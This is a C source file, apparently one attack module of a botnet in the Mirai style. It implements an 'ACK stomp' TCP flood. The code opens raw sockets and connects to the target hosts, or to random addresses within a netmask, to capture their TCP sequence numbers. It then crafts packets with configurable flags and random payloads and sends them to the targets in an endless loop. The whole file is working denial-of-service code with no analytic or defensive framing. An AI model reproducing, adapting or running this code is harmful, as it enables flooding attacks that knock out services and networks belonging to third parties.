#define _GNU_SOURCE

#include "../../attack.h"

void flood_stomp(struct flood *flood)
{
    int i, rfd;
    struct stomp_data *stomp_data = calloc(flood->num_of_targets, sizeof(struct stomp_data));
    char **pkts = calloc(flood->num_of_targets, sizeof(char *));

    flood->settings->ack = get_option_number(flood->num_of_options, flood->options, OPT_ACK, 0);
    flood->settings->psh = get_option_number(flood->num_of_options, flood->options, OPT_PSH, 0);

    // Set up receive socket
    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("Could not open raw socket!\n");
#endif
        return;
    }
    i = 1;
    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(rfd);
        return;
    }

    // Retrieve all ACK/SEQ numbers
    for (i = 0; i < flood->num_of_targets; i++)
    {
        int fd;
        struct sockaddr_in addr, recv_addr;
        socklen_t recv_addr_len;
        char pktbuf[256];
        time_t start_recv;

    stomp_setup_nums:

        if ((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        {
#ifdef DEBUG
            printf("Failed to create socket!\n");
#endif
            continue;
        }

        // Set it in nonblocking mode
        fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);

        // Set up address to connect to
        addr.sin_family = AF_INET;
        if (flood->targets[i].netmask < 32)
            addr.sin_addr.s_addr = htonl(ntohl(flood->targets[i].addr) + (((uint32_t)rand_next()) >> flood->targets[i].netmask));
        else
            addr.sin_addr.s_addr = flood->targets[i].addr;
        if (flood->settings->dest_port == 0xffff)
            addr.sin_port = rand_next() & 0xffff;
        else
            addr.sin_port = htons(flood->settings->dest_port);

        // Actually connect, nonblocking
        connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
        start_recv = time(NULL);

        // Get info
        while (TRUE)
        {
            int ret;

            recv_addr_len = sizeof(struct sockaddr_in);
            ret = recvfrom(rfd, pktbuf, sizeof(pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
            if (ret == -1)
            {
#ifdef DEBUG
                printf("Could not listen on raw socket!\n");
#endif
                return;
            }
            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof(struct iphdr) + sizeof(struct tcphdr)))
            {
                struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof(struct iphdr));

                if (tcph->source == addr.sin_port)
                {
                    if (tcph->syn && tcph->ack)
                    {
                        struct iphdr *iph;
                        struct tcphdr *tcph;
                        char *payload;

                        stomp_data[i].addr = addr.sin_addr.s_addr;
                        stomp_data[i].seq = ntohl(tcph->seq);
                        stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                        stomp_data[i].sport = tcph->dest;
                        stomp_data[i].dport = addr.sin_port;
#ifdef DEBUG
                        printf("ACK Stomp got SYN+ACK!\n");
#endif
                        // Set up the packet
                        pkts[i] = malloc(sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);
                        iph = (struct iphdr *)pkts[i];
                        tcph = (struct tcphdr *)(iph + 1);
                        payload = (char *)(tcph + 1);

                        iph->version = 4;
                        iph->ihl = 5;
                        iph->tos = flood->settings->tos;
                        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length);
                        iph->id = htons(flood->settings->ident);
                        iph->ttl = flood->settings->ttl;
                        if (flood->settings->dont_fragment)
                            iph->frag_off = htons(1 << 14);
                        iph->protocol = IPPROTO_TCP;
                        iph->saddr = LOCAL_ADDR;
                        iph->daddr = stomp_data[i].addr;

                        tcph->source = stomp_data[i].sport;
                        tcph->dest = stomp_data[i].dport;
                        tcph->seq = stomp_data[i].ack_seq;
                        tcph->ack_seq = stomp_data[i].seq;
                        tcph->doff = 8;
                        tcph->fin = TRUE;
                        tcph->ack = TRUE;
                        tcph->window = rand_next() & 0xffff;
                        tcph->urg = flood->settings->urg;
                        tcph->ack = flood->settings->ack;
                        tcph->psh = flood->settings->psh;
                        tcph->rst = flood->settings->rst;
                        tcph->syn = flood->settings->syn;
                        tcph->fin = flood->settings->fin;

                        rand_str(payload, flood->settings->length);
                        break;
                    }
                    else if (tcph->fin || tcph->rst)
                    {
                        close(fd);
                        goto stomp_setup_nums;
                    }
                }
            }

            if (time(NULL) - start_recv > 10)
            {
#ifdef DEBUG
                printf("Couldn't connect to host for ACK Stomp in time. Retrying\n");
#endif
                close(fd);
                goto stomp_setup_nums;
            }
        }
    }

    // Start spewing out traffic
    while (TRUE)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            char *data = (char *)(tcph + 1);

            if (flood->settings->ident == 0xffff)
                iph->id = rand_next() & 0xffff;

            // Randomize payload when data randomization is turned on.
            if (flood->settings->random_data)
            {
                if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                    flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

                rand_str(data, flood->settings->length);
            }
 

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            tcph->seq = htons(stomp_data[i].seq++);
            tcph->ack_seq = htons(stomp_data[i].ack_seq);
            tcph->check = 0;
            tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + flood->settings->length), sizeof(struct tcphdr) + flood->settings->length);

            flood->targets[i].sock_addr.sin_port = tcph->dest;
            sendto(rfd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + flood->settings->length, MSG_NOSIGNAL, (struct sockaddr *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
        }
#ifdef DEBUG
        break;
        if (errno != 0)
            printf("errno = %d\n", errno);
#endif
    }
}
